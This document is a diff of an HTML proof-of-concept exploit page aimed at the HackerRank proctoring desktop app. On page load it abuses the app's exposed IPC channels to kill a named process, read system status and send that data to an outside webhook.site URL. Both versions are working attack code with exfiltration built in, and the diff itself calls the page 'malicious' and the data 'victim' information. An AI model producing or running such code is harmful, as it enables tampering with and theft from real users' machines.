@@ -1,62 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HackerRank Test App – Self-Test Exploit</title>
+    <title>My Own Test – RCE PoC</title>
     <meta charset="utf-8">
 </head>
 <body>
-    <h2>Self-Test Payload Running...</h2>
+    <h3>Self-Test Running… (check your webhook + Calculator)</h3>
     <pre id="log"></pre>
 
     <script>
-        // Adjust this line if your preload exposes ipcRenderer under a different name
-        const ipc = window.ipcRenderer || window.myIPC || window.electron;
+        // This is the correct name used by the real HackerRank preload script
+        const { ipcRenderer } = window.electronAPI;
 
         function log(msg) {
             console.log(msg);
             document.getElementById('log').textContent += msg + '\n';
         }
 
-        async function exploit() {
+        async function run() {
             try {
-                // 1. Kill calc.exe (open Calculator first to see it disappear)
-                await ipc.invoke('close-blocked-apps', ['calc.exe']);
-                log('calc.exe killed');
+                // 1. Kill calc.exe (open Calculator first to see it die)
+                await ipcRenderer.invoke('close-blocked-apps', ['calc.exe']);
+                log('calc.exe killed successfully');
             } catch (e) {
-                log('Failed to kill calc.exe: ' + e.message);
+                log('calc.exe kill failed: ' + e);
             }
 
             try {
-                // 2. Steal system status
-                const info = await ipc.invoke('get-system-status');
-                log('System info captured:');
+                // 2. Grab system info
+                const info = await ipcRenderer.invoke('get-system-status');
+                log('System info stolen:');
                 log(JSON.stringify(info, null, 2));
 
-                // 3. Exfiltrate to your webhook
+                // 3. Send to YOUR webhook only
                 fetch('https://webhook.site/fcaeefd5-63e5-4baf-b1d0-ddfaea039ffa', {
                     method: 'POST',
-                    mode: 'no-cors', // important – avoids CORS block in most cases
+                    mode: 'no-cors',
                     body: JSON.stringify({
                         timestamp: new Date().toISOString(),
-                        victim_system_info: info,
-                        message: "HackerRank proctoring app successfully exploited"
-                    }),
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                }).then(() => {
-                    log('Data successfully sent to your webhook!');
-                }).catch(() => {
-                    log('Webhook sent (no-cors mode – check your webhook dashboard)');
+                        source: "my-own-hackerrank-test",
+                        system_info: info
+                    })
                 });
-
+                log('Data sent to your webhook');
             } catch (e) {
-                log('Failed to get system status: ' + e.message);
+                log('Status steal failed: ' + e);
             }
         }
 
-        // Run immediately when the malicious page loads inside the Electron app
-        exploit();
+        run();
     </script>
 </body>
 </html>
